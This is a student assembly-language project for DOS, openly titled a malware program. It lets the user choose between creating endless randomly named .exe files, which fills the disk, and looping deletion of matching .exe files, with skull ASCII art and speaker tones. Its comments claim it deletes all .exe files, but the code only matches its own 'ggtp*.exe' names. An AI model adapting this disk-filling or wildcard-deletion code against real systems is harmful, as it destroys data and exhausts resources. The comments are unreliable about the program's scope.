;@2019
;AUTHOR   :   -ALEXANDER PATRICK      (TEKNIK KOMPUTER - 1706043292 - M)
;             -GITA AYU SALSABILA     (TEKNIK KOMPUTER - 1706043310 - M)
;             -NICHOLAS GILBERT       (TEKNIK KOMPUTER - 1706043323 - M)
;             -TEUKU SALMAN FARIZI    (TEKNIK KOMPUTER - 1706043216 - M)
;
;KELOMPOK :  15A
;TEMA     :  PROGRAM MALWARE
;---------------------------------------------------------------------------------------------------------------------------------------------
;SKENARIO : 1.USER MEMILIH APAKAH MALWARE AKAN MENGHASILKAN FILE SECARA TERUS MENERUS ATAU MENGHAPUS FILE
;           2.FILE .EXE PADA DIREKTORI AKAN DIHAPUS
;---------------------------------------------------------------------------------------------------------------------------------------------
;
;      PROGRAM MALWARE merupakan program yang dapat menghasilkan file berkestensi .exe secara tidak terbatas dan menghapus seluruh 
;                      file .exe pada direktori yang sama dengan direktori program disimpan
;
;      Copyright (C) 2019 Alexander Patrick, Gita Ayu Salsabila, Nicholas Gilbert, Teuku Salman Farizi
;
;                   This program is free software; you can redistribute it and/or modify it under the terms of the  
;                   GNU General Public Licence as published by the Free Software Foundation; either version 3 of the liscence,
;                   (at your option) any latter version.
;
;                   This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
;                   without even the imlied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. 
;                   See the GNU General Public LIscense for more details.
;
;---------------------------------------------------------------------------------------------------------------------------------------------
;REFERENSI : https://github.com/AbdelrahmanRadwan/Simple-Malware
;---------------------------------------------------------------------------------------------------------------------------------------------

.model small
.code
org 100h
    
    
start:
    LEA DX, line1        
    MOV AH, 09H
    INT 21H
    LEA DX, header       
    MOV AH, 09H
    INT 21H
    LEA DX, line2       
    MOV AH, 09H
    INT 21H
    LEA DX, MSG1       
    MOV AH, 09H
    INT 21H
    LEA DX, MSG2       
    MOV AH, 09H
    INT 21H
    MOV AH, 01H     
    INT 21H
    CMP AL, "1"
    JE create 
    JMP delete

;membuat file
create:              ;infinite looping untuk membuat file
    call buat
    JMP CREATE
    
delete:              ;infinite looping untuk menghapus file
    call hapusexe
    jmp delete
    
buat proc            ;procedure untuk membuat file
    jmp lop
        
lop: 
    call random      ;memanggil angka random
    cmp ax,0         ;jika angka random yang dihasilkan bernilai 0 maka file tidak bisa dibuat sehingga perlu memanggil fungsi random lagi
    ja good          ;jika angka random bukan 0 maka angka random akan diproses sebagai nama dari file yang akan dibuat
    jmp lop

good:
	MOV BX, 10       
	MOV SI, 4        ;mengisi angka random di posisi ke-4 setelah "ggtp"
	opt:
		CMP AX, 10000;memastikan angka yang dipakai tidak kurang dari 5 digit
		JAE bra      ;jika lebih maka akan diproses lebih lanjut  
		IMUL bx      ;mengalikan dengan 10 nilai yang akan diproses hingga nilainya sama dengan atau lebih di 5 digit  
		JMP opt      ;

bra:
	W:
		MOV DX, 0    ;mengosongkan register dx
		DIV BX       
		ADD DL, 48   ;menyesuaikan angka dengan ASCII
		MOV Rnd[SI], DL
		INC SI       ;berpindah ke elemen selanjutnya dari SI
		CMP AX, 0
		JE done
	JMP W	

done:      
    mov dl, "."      ;menambahkan ekstensi .exe ke setiap 
    mov rnd[si],dl   
    
    inc si           
    mov dl, "e"      
    mov rnd[si],dl   
    
    inc si           
    mov dl, "x"      
    mov rnd[si],dl   
    
    inc si
    mov dl, "e"
    mov rnd[si],dl
            
    lea dx, rnd      ;memasukkan semua isi dari variable RND
    mov cx, 0h
    mov ah, 3Ch
    int 21h          ;membuat file
    jnc close        ;jika file gagal dibuat maka akan membuat carry flag menjadi 1 
    call buat
    
close:
    mov bx, ax       ;handler untuk int 21h/3ch berada pada ax, sedangkan handler untuk int 21h/3eh adalah bx 
    mov ah, 3Eh      ;menutup file yang telah dibuat
    int 21h
    call loading
    call buat 
    
endp

randgen proc
    mov ax,0
    mov ah, 2ch
    int 21h 
    xor ax,ax
    mov al,dl   
    xor dx,dx
    mov bx,10
    div bx  
    ret                       
endp

random proc
    mov ax,0
    call [randgen]
    mov [ones], dl
    
    
    call [randgen]
    mov [tens], dl
    
    
    call [randgen]
    mov [hundsa], dl 
    
    mov ax, 0
    mov bx, 0
    mov bl, 10
    
    mov al, [tens]
    mul bl 
    mov [tens], al
    
    mov ax, 0
    mov bx, 0
    mov bl, 100
    
    mov al, [hundsa]
    mul bl 
    mov [hundsa], al
    mov [hundsb], ah  
    
    mov al, [hundsa]
    mov ah, [hundsb]
    mov [numb], ax
    
    mov ax, 0
    mov al, [tens]
    add [numb], ax 
    
    mov ax, 0
    mov al, [ones]
    add [numb], ax
    mov ax, [numb]
    
    ret
endp

hapusexe PROC                     ;procedure untuk menghapus file
	MOV DX,OFFSET DTA              
	MOV AH,1Ah
	INT 21h
	
	LEA DX,file                   ;nama file yang akan dicari
	MOV CX,00h
	MOV AH,4Eh                    ;cari file	
	INT 21h	
	JC Quit1                      ;jika file yang dicari tidak ditemukan maka akan berhenti
	
	LEA DX,DTA+30
	MOV AH,41H                    ;interrup untuk menghapus file dengan semua nama yang sesuai
	INT 21H
    call loading
     
    QUIT1:
    call loading
    ret
ENDP

delay proc                  ;untuk memberikan delay pada lagu
  push ax                   ;meletakkan register ax pada stack
  mov ax,40h                ;mengosongkan register ax
  mov es,ax                 ;memindahkan register ax ke segmen es
  mov ax,[clock]            ;memberikan nilai clock pertama 
  
  Ketukawal:
    cmp ax, [clock]
    mov cx, 2               
    je Ketukawal
  
  Loopdelay:
    mov ax, [clock]
    ketuk:
       cmp ax,[clock]
       je ketuk
       loop Loopdelay
       pop ax
    ret
endp 

sounder proc
  push ax
  in al, 61h
  or al, 00000011b          ;mengakses soundcard
  out 61h, al 	            ;mengirim control word untuk ganti frekuensi
  mov al, 0B6h
  out 43h, al
  mov ax, [tone]            ;tone merupakan acuan untuk mengambil nada dari acuan
  out 42h, al               ; mengirim lower byte
  mov al, ah
  out 42h, al               ; mengirim upper  byte
  pop ax
  ret
endp

pencet macro p1
    push bx
    mov bx,[p1]              ;memasukkan parameter berupa not yang ditekan ke bx
    mov [tone],bx            ;memasukkan bx ke tone agar bisa dibunyikan
    pop bx
    call sounder
endm
   
matisuara proc             
    in al,61h
    and al, 11111100b      ;menutup soundcard (invers dari akses soundcard)
    out 61h, al
    ret
endp

   
pdelay proc
        mov ah,0h
        int 1ah      ;delay
    
        mov ah,0h
        int 1ah      ;delay
    
        mov ah,0h
        int 1ah      ;delay
    
        mov ah,0h
        int 1ah      ;delay
        
        mov ah,0h
        int 1ah      ;delay
    
        mov ah,0h
        int 1ah      ;delay
    
        mov ah,0h
        int 1ah      ;delay
    
        mov ah,0h
        int 1ah      ;delay
        ret
endp

loading proc
    mov ah,0fh
    int 10h
    push ax
    push bx 
    mov ah,0 
    int 10h

    pop bx 
    pop dx
    mov dl,dh
    dec dl
    mov dh,0 
    push bx 
    mov ah,2 
    int 10h
 
  
    
    mov dx,offset load
    mov ah,09h
    int 21h
    pencet fi
    call delay 
    call delay
    call matisuara
    mov dx,offset load1
    mov ah,09h
    int 21h
    pencet do_tinggi 
    call delay
    call matisuara
    call pdelay
    
    mov dx,offset load2
    mov ah,09h
    int 21h
        pencet fi
    call delay 
    call delay
    call matisuara
    call pdelay
    
    mov dx,offset load3
    mov ah,09h
    int 21h
    pencet do_tinggi 
    call delay
    call matisuara
    call pdelay
    
    mov dx,offset load4
    mov ah,09h
    int 21h
        pencet fi
    call delay 
    call delay
    call matisuara
    call pdelay
    
    mov dx,offset load5
    mov ah,09h
    int 21h
    pencet do_tinggi 
    call delay
    call matisuara
    call pdelay
    
    mov dx,offset load6
    mov ah,09h
    int 21h
    pencet fi
    call delay 
    call delay
    call matisuara
    call pdelay
    
    
    mov dx,offset load8
    mov ah,09h
    int 21h
    pencet do_tinggi 
    call delay
    call matisuara
    call pdelay

    
    mov dx,offset load10
    mov ah,09h
    int 21h
    pencet fi
    call delay 
    call delay
    call matisuara
    call pdelay
    
    
    mov dx,offset load12
    mov ah,09h
    int 21h
    pencet do_tinggi 
    call delay
    call matisuara
    call pdelay
    
    mov dx,offset load13
    mov ah,09h
    int 21h
    pencet fi
    call delay 
    call delay
    call matisuara
    call pdelay
    
    mov dx,offset load15
    mov ah,09h
    int 21h
    pencet do_tinggi 
    call delay
    call matisuara
    call pdelay
    
    mov dx,offset load16
    mov ah,09h
    int 21h
    pencet fi
    call delay 
    call delay
    call matisuara 
    call pdelay
    
    mov dx,offset load17
    mov ah,09h
    int 21h
    pencet do_tinggi 
    call delay
    call matisuara
    call pdelay
    
    mov dx,offset load18
    mov ah,09h
    int 21h
    pencet fi
    call delay 
    call delay
    call matisuara
    call pdelay
    
    
    mov dx,offset load20
    mov ah,09h
    int 21h
    pencet do_tinggi 
    call delay
    call matisuara
    call pdelay
    
    mov dx,offset load21
    mov ah,09h
    int 21h
    pencet fi
    call delay 
    call delay
    call matisuara
    call pdelay
    
    mov dx,offset load22
    mov ah,09h
    int 21h
    pencet do_tinggi 
    call delay
    call matisuara
    call pdelay
    
    mov dx,offset load23
    mov ah,09h
    int 21h
    pencet fi
    call delay 
    call delay
    call matisuara
    call pdelay
    
    mov dx,offset load25
    mov ah,09h
    int 21h
    pencet do_tinggi 
    call delay
    call matisuara
    call pdelay
    
    mov dx,offset load26
    mov ah,09h
    int 21h
    pencet fi
    call delay 
    call delay
    call matisuara
    call pdelay
    pop ax
    pop bx
    ret
endp
    

line1  db "===============================================================", 13, 10,'$' 
header db " T H I S   I S   M A L W A R E   P R O G R A M ", 13, 10, '$'
line2  db "===============================================================", 13, 10, '$'      
msg1    DB "Press 1 to generate .exe file infinetly",13,10, '$' 
msg2    DB "Press 2 to delete all files with .exe extension",13,10, '$'
;DES1    dB "Generating...",13,10, '$'
DES2    DB "Destroying your Files..",13,10,'$'  
;outhandle dw ?
rnd     db  "ggtp",15 dup (?),0  
ones    db  0
tens    db  0
hundsa  db  0
hundsb  db  0
numb    dw  0

file DB "ggtp*.exe", 0
filehapus db 10 dup(?)
DTA     DB 128 DUP(0)

load    db '             MALWARE RUNNING             ', 13, 10, '$'
load1   db '                 uuuuuuu                 ', 13, 10, '$'
load2   db '             uu00000000000uu             ', 13, 10, '$'
load3   db '          uu00000000000000000uu          ', 13, 10, '$'
load4   db '         u000000000000000000000u         ', 13, 10, '$'
load5   db '        u00000000000000000000000u        ', 13, 10, '$'
load6   db '       u0000000000000000000000000u       ', 13, 10, '$'
load8   db '       u000000u   u000u   u000000u       ', 13, 10, '$'
load10  db '        000u       u0u       u000        ', 13, 10, '$'
load12  db '         u0000uu000   000uu0000u         ', 13, 10, '$'
load13  db '          u0000000u   u0000000u          ', 13, 10, '$'
load15  db '             u0n0n0n0n0n0n0u             ', 13, 10, '$'
load16  db '  uuu        00u0 0 0 0 0u00       uuu   ', 13, 10, '$'
load17  db ' u0000        00000u0u0u000       u0000  ', 13, 10, '$'
load18  db '  00000uu      u000000000u     uu000000  ', 13, 10, '$'
load20  db '   0nnn0000000000uu0000uu000000000nnn    ', 13, 10, '$'
load21  db '          nn00000000000uu nn0nnn         ', 13, 10, '$'
load22  db '           uuuu nn0000000000uuu          ', 13, 10, '$'
load23  db '  u000uuu000000000uu nn00000000000uuu000 ', 13, 10, '$'
load25  db '   n00000n                      nn0000nn ', 13, 10, '$'
load26  db '     000n                         0000n  ', 13, 10, '$'
    sol_tinggi dw 880 ;nada sol oktaf 2
    fa_tinggi dw 987  ;nada fa oktaf2
    mi_tinggi dw 1046 ;nada mi oktaf 2
    re_tinggi dw 1174 ;nada re oktaf 2
    do_tinggi dw 1318 ;nada do okttaf 
    sii dw 1396       ;nada si oktaf 1
    la  dw 1567       ;nada la oktaf 1 
    sel dw 1650
    sol dw 1760       ;nada sol oktaf 1 
    fi  dw 1890
    fa  dw 1975       ;nada fa oktaf 1
    mi  dw 2093       ;nada mi oktaf 1
    re  dw 2413
    do  dw 2681 
    clock equ es:6Ch  ;clock pada es 
    tone dw ?         ;deklarasi variabel tone yang kosong

selesai:
end start